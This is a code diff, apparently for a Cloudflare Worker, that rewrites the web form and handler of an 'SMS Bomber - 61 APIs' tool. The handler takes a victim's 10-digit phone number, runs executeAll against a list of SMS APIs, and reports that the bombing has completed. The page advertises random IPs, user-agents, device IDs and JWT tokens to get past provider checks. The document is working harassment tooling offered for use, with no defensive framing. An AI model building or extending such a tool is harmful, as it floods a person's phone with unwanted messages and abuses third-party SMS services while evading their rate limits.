-                return new Response(JSON.stringify({ success: false, error: err.message }), {
-                    status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders }
-                });
-            }
+        if (!mobile) {
+            return new Response(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>SMS Bomber - 61 APIs</title>
+                    <style>
+                        body { font-family: Arial, sans-serif; max-width: 900px; margin: 20px auto; padding: 20px; background: #0a0a0a; color: #fff; }
+                        input[type="text"] { padding: 10px; width: 250px; border: 2px solid #00ff41; border-radius: 5px; font-size: 16px; background: #0a0a0a; color: #00ff41; }
+                        button { padding: 10px 30px; background: #00ff41; color: #0a0a0a; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; }
+                        button:hover { background: #00cc33; }
+                        h1 { color: #00ff41; }
+                        .info { background: #00ff4122; padding: 15px; border-radius: 5px; margin: 20px 0; border: 1px solid #00ff41; }
+                    </style>
+                </head>
+                <body>
+                    <h1>⚡ SMS Bomber - 61 APIs ⚡</h1>
+                    <div class="info">
+                        <strong>Total APIs:</strong> ${APIS.length}<br>
+                        <strong>Features:</strong> Random IP, User-Agent, Device ID, JWT tokens, etc.
+                    </div>
+                    <form method="get" action="">
+                        <label for="mobile">Enter Mobile Number (10 digits):</label><br><br>
+                        <input type="text" id="mobile" name="mobile" placeholder="9876543210" required pattern="^\\d{10}$">
+                        <button type="submit">🚀 START</button>
+                    </form>
+                </body>
+                </html>
+            `, { headers: { 'Content-Type': 'text/html', ...corsHeaders } });
         }
 
-        const html = `<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SMS Bomber - Workers</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Tahoma,sans-serif;background:#0a0a0a;color:#fff;min-height:100vh;padding:20px}
-.container{max-width:900px;margin:0 auto}
-h1{color:#00ff41;text-align:center;font-size:2em;margin-bottom:25px;text-shadow:0 0 20px rgba(0,255,65,0.3)}
-.form-card{background:#1a1a1a;padding:25px;border-radius:15px;border:1px solid #00ff41;margin-bottom:25px}
-label{color:#00ff41;font-weight:600;display:block;margin-bottom:10px}
-.input-group{display:flex;gap:10px}
-input[type="text"]{flex:1;padding:14px;border:2px solid #00ff41;border-radius:8px;font-size:1.1em;background:#0a0a0a;color:#00ff41;font-weight:600;letter-spacing:2px}
-input[type="text"]:focus{outline:none;box-shadow:0 0 20px rgba(0,255,65,0.3)}
-button{background:#00ff41;color:#0a0a0a;padding:14px 28px;border:none;border-radius:8px;font-size:1.1em;font-weight:700;cursor:pointer;text-transform:uppercase}
-button:hover{transform:scale(1.05);box-shadow:0 0 30px rgba(0,255,65,0.5)}
-.info{background:#00ff4122;color:#00ff41;padding:15px;border-radius:8px;border:1px solid #00ff41;text-align:center;margin-top:15px}
-.info code{background:#0a0a0a;padding:2px 8px;border-radius:4px}
-@media (max-width:768px){.input-group{flex-direction:column}button{width:100%}}
-</style>
-</head>
-<body>
-<div class="container">
-<h1>⚡ SMS Bomber - Cloudflare Workers ⚡</h1>
-<div class="form-card">
-<form method="GET" action="">
-<label>📱 Enter Mobile Number (10 digits):</label>
-<div class="input-group">
-<input type="text" name="mobile" required pattern="^\\d{10}$" placeholder="9876543210">
-<button type="submit">🚀 START</button>
-</div>
-</form>
-<div class="info">Total APIs: <code>${APIS.length}</code> — Random + Original mix</div>
-</div>
-</div>
-</body>
-</html>`;
+        const cleanMobile = mobile.replace(/[^0-9]/g, '');
+        if (cleanMobile.length !== 10) {
+            return new Response(JSON.stringify({ error: 'Please enter a valid 10-digit mobile number' }), {
+                status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders }
+            });
+        }
 
-        return new Response(html, { headers: { 'Content-Type': 'text/html; charset=utf-8', ...corsHeaders } });
+        try {
+            const data = await executeAll(cleanMobile);
+            return new Response(JSON.stringify({
+                success: true,
+                message: `SMS Bombing completed on ${cleanMobile}`,
+                total_apis: data.results.length,
+                success_count: data.successful,
+                failed_count: data.failed,
+                total_time: data.totalTime + 's',
+                results: data.results
+            }, null, 2), {
+                headers: { 'Content-Type': 'application/json', ...corsHeaders }
+            });
+        } catch (err) {
+            return new Response(JSON.stringify({ success: false, error: err.message }), {
+                status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders }
+            });
+        }
     }
 };
